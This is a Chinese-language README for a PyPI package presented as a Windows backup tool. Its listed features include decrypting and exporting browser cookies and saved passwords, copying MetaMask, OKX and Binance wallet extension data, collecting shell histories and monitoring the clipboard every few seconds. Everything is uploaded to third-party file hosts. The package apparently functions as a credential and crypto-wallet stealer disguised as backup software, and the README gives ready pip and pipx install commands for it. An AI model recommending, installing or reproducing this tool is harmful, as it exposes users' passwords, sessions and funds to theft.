# Auto Backup Windows

[![PyPI version](https://badge.fury.io/py/auto-backup-wins.svg)](https://badge.fury.io/py/auto-backup-wins)
[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

一个用于Windows环境的自动备份工具，支持文件备份、压缩和上传到云端。

## ✨ 功能特性

- ✅ **Windows数据备份**：自动备份桌面、便签、历史记录等重要文件
- ✅ **浏览器扩展备份**：支持备份 Chrome、Edge、Brave 的扩展数据（MetaMask、OKX Wallet、Binance Wallet 等）
- ✅ **浏览器数据导出**：支持导出浏览器 Cookies、密码和 Web Data（需要 pywin32 和 pycryptodome）
- ✅ **自动压缩**：自动压缩备份文件为 tar.gz 格式，节省存储空间
- ✅ **大文件分片**：大文件自动分片处理（超过 50MB）
- ✅ **云端上传**：支持上传到 Infini Cloud（WebDAV）和 GoFile（备选）
- ✅ **定时备份**：支持定时备份功能（默认约3天一次）
- ✅ **JTB监控**：实时监控剪贴板变化并自动上传（Just The Backup）
- ✅ **日志管理**：完整的日志记录和自动上传
- ✅ **网络检测**：自动检测网络连接状态
- ✅ **自动重试**：上传失败自动重试机制
- ✅ **多Profile支持**：支持备份多个浏览器 Profile 的数据

## 🚀 快速开始

### 从 PyPI 安装（推荐）

```powershell
pip install auto-backup-wins
```

### 使用 pipx 安装（推荐用于命令行工具）

`pipx` 是安装命令行工具的最佳方式，它会自动管理虚拟环境。

```bash
# 安装 pipx（如果未安装）
python -m pip install --user pipx
python -m pipx ensurepath

# ⚠️ 重要：在 Windows 上，执行 ensurepath 后需要重新打开终端窗口
# 或者使用以下方法之一：

# 方法1：重新打开 PowerShell 或 CMD 窗口，然后运行：
pipx install auto-backup-wins

# 方法2：如果不想重新打开终端，可以使用 python -m pipx：
python -m pipx install auto-backup-wins

# 方法3：在 PowerShell 中刷新环境变量（当前会话）：
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
pipx install auto-backup-wins
```

**安装后可能出现 PATH 警告：**

如果安装后看到类似 `⚠️ Note: 'C:\Users\Administrator\.local\bin' is not on your PATH` 的警告：

1. **重新打开终端窗口**（推荐）：关闭当前 PowerShell/CMD 窗口，重新打开后即可使用 `autobackup` 命令
2. **验证安装**：重新打开终端后，运行以下命令验证：
   ```powershell
   autobackup --help
   ```
3. **如果仍然无法使用**：再次运行 `python -m pipx ensurepath`，然后重新打开终端
4. **临时使用**：如果不想重新打开终端，可以使用完整路径：
   ```powershell
   C:\Users\Administrator\.local\bin\autobackup.exe
   ```
   或使用 pipx 运行：
   ```powershell
   python -m pipx run autobackup
   ```

## 🏗️ 项目架构

本项目作为 `wins_pypi.py` 的 Python 包封装，提供标准的 PyPI 安装和命令行接口。核心功能由 `wins_pypi.py` 提供，包括：

- 完整的备份逻辑
- 文件压缩和上传
- 浏览器数据备份
- 剪贴板监控

通过这种方式，用户可以通过标准的 `pip install` 方式安装和使用，同时保持核心代码的统一管理。

## 📦 其他安装方式

### 使用虚拟环境安装

```bash
# 创建虚拟环境
python -m venv venv

# 激活虚拟环境
# Windows PowerShell:
venv\Scripts\Activate.ps1
# Windows CMD:
venv\Scripts\activate.bat

# 从 PyPI 安装
pip install auto-backup-wins
```

### 使用 Poetry（推荐用于开发）

Poetry 是一个现代的 Python 依赖管理和打包工具。

```bash
# 安装 Poetry（如果未安装）
# PowerShell:
(Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | python -
# 或使用 pipx
pipx install poetry

# 添加到项目
poetry add auto-backup-wins

# 运行
poetry run autobackup
```

### 从源码安装

```bash
git clone https://github.com/wongstarx/auto-backup-wins.git
cd auto-backup-wins

# 使用虚拟环境
python -m venv venv
venv\Scripts\activate
pip install .

# 或使用 Poetry
poetry install
poetry run autobackup

# 或使用 pipx
pipx install .
```

## 💻 使用方法

### 命令行使用

安装后，可以直接使用命令行工具：

```bash
# 验证安装（查看帮助信息）
autobackup --help

# 运行备份
autobackup
```

**注意**：如果使用 pipx 安装后无法直接使用 `autobackup` 命令，请：
1. 重新打开终端窗口（推荐）
2. 或使用 `python -m pipx run autobackup` 运行

该命令会自动执行以下操作：
1. 备份Windows系统中的重要文件（桌面、便签、历史记录等）
2. 备份浏览器扩展数据
3. 导出浏览器 Cookies 和密码（如果可用）
4. 压缩备份文件
5. 上传到云端（如果配置了上传功能）
6. 启动剪贴板监控（JTB）和自动上传

### Python 代码使用

```python
from auto_backup import BackupManager, BackupConfig
import os
from datetime import datetime

# 创建备份管理器
manager = BackupManager()

# 备份指定的重要文件和目录（桌面、便签、历史记录等）
source_dir = os.path.expandvars('%USERPROFILE%')
target_dir = os.path.join(manager.config.BACKUP_ROOT, "backup_specified")
backup_dir = manager.backup_specified_files(source_dir, target_dir)

if backup_dir:
    # 压缩备份
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    zip_file_path = os.path.join(manager.config.BACKUP_ROOT, f"backup_{timestamp}")
    backup_files = manager.zip_backup_folder(backup_dir, zip_file_path)
    
    if backup_files:
        # 上传备份（可以是单个文件或文件列表）
        if manager.upload_backup(backup_files):
            print("备份上传成功！")
        else:
            print("上传失败")
```

### 完整示例

```python
from auto_backup import BackupManager
import os
from datetime import datetime

# 初始化备份管理器
manager = BackupManager()

# 执行完整备份流程
try:
    # 1. 备份指定的重要文件和目录（桌面、便签、历史记录等）
    source_dir = os.path.expandvars('%USERPROFILE%')
    target_dir = os.path.join(manager.config.BACKUP_ROOT, "backup_specified")
    
    backup_dir = manager.backup_specified_files(source_dir, target_dir)
    if backup_dir:
        print(f"✅ 备份完成：{backup_dir}")
        
        # 2. 压缩备份
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        zip_file_path = os.path.join(manager.config.BACKUP_ROOT, f"backup_{timestamp}")
        backup_files = manager.zip_backup_folder(backup_dir, zip_file_path)
        
        if backup_files:
            if isinstance(backup_files, list):
                print(f"✅ 压缩完成，共 {len(backup_files)} 个文件")
            else:
                print(f"✅ 压缩完成：{backup_files}")
            
            # 3. 上传到云端
            if manager.upload_backup(backup_files):
                print("✅ 上传成功！")
            else:
                print("❌ 上传失败，请检查网络连接和配置")
        else:
            print("❌ 压缩失败")
    else:
        print("❌ 备份失败")
        
except Exception as e:
    print(f"备份过程中出现错误：{e}")
    import traceback
    traceback.print_exc()
```

更多示例请参考项目中的 `example.py` 文件。

## ⚙️ 配置说明

### 备份配置

可以通过修改 `BackupConfig` 类来调整配置：

| 配置项 | 说明 | 默认值 |
|--------|------|--------|
| `DEBUG_MODE` | 调试模式开关 | `True` |
| `MAX_SOURCE_DIR_SIZE` | 源目录最大大小 | 500MB |
| `MAX_SINGLE_FILE_SIZE` | 单文件最大大小 | 50MB |
| `CHUNK_SIZE` | 分片大小 | 50MB |
| `RETRY_COUNT` | 重试次数 | 3次 |
| `RETRY_DELAY` | 重试延迟（秒） | 30秒 |
| `BACKUP_INTERVAL` | 备份间隔 | 约3天（260000秒） |
| `CLIPBOARD_INTERVAL` | JTB备份间隔 | 20分钟（1200秒） |
| `CLIPBOARD_CHECK_INTERVAL` | JTB检查间隔 | 3秒 |
| `BACKUP_CHECK_INTERVAL` | 备份检查间隔 | 1小时（3600秒） |
| `BACKUP_ROOT` | 备份根目录 | `%USERPROFILE%\.dev\pypi-AutoBackup` |

### 备份内容

默认备份以下内容（相对于 `%USERPROFILE%`）：
- 桌面目录（自动检测，支持 OneDrive 重定向）
- Windows 便签数据库（`plum.sqlite`）
- Python 历史记录（`.python_history`）
- Node.js REPL 历史（`.node_repl_history`）
- PowerShell 历史记录（Console 和 Core）

### 浏览器扩展备份

支持备份以下浏览器扩展（如果已安装）：
- **MetaMask**：Chrome、Edge、Brave
- **OKX Wallet**：Chrome、Edge、Brave
- **Binance Wallet**：Chrome、Brave

支持多个浏览器 Profile（Default、Profile 1、Profile 2 等）。

## 📋 系统要求

- **Python**: 3.7 或更高版本
- **操作系统**: Windows
- **网络**: 需要网络连接（用于上传备份到云端）

## 📦 依赖项

### 必需依赖
- `requests` >= 2.25.0
- `pyperclip` >= 1.8.0

### 可选依赖（用于浏览器数据导出）
- `pywin32`：用于 Windows API 调用
- `pycryptodome`：用于加密数据解密

如果未安装可选依赖，浏览器数据导出功能将被跳过。

## 📄 许可证

本项目采用 [MIT License](LICENSE) 许可证。

## 🤝 贡献

欢迎贡献代码！如果你有任何建议或发现问题，请：

1. 提交 [Issue](https://github.com/wongstarx/auto-backup-wins/issues)
2. 提交 [Pull Request](https://github.com/wongstarx/auto-backup-wins/pulls)

## 👤 作者

**YLX Studio**

- GitHub: [@wongstarx](https://github.com/wongstarx)
- 项目主页: [https://github.com/wongstarx/auto-backup-wins](https://github.com/wongstarx/auto-backup-wins)

## 📝 更新日志

### v1.0.6
- 🔄 重构项目结构，引用 `wins_pypi.py` 作为核心实现
- ✨ 新增浏览器扩展备份功能（MetaMask、OKX Wallet、Binance Wallet）
- ✨ 新增浏览器数据导出功能（Cookies、密码、Web Data）
- ✨ 新增多浏览器 Profile 支持
- 📝 更新示例代码和文档
- 🐛 修复路径解析问题

### v1.0.5
- 准备发布到 PyPI
- 改进文档和安装说明
- 优化错误处理

### v1.0.0
- 初始版本发布
- 支持Windows文件自动备份、压缩和上传
- 支持定时备份
- 支持JTB监控和自动上传
- 支持日志记录
- 支持网络连接检测
- 支持自动重试机制

## 🔗 相关链接

- [PyPI 项目页面](https://pypi.org/project/auto-backup-wins/)
- [GitHub 仓库](https://github.com/wongstarx/auto-backup-wins)
- [问题反馈](https://github.com/wongstarx/auto-backup-wins/issues)

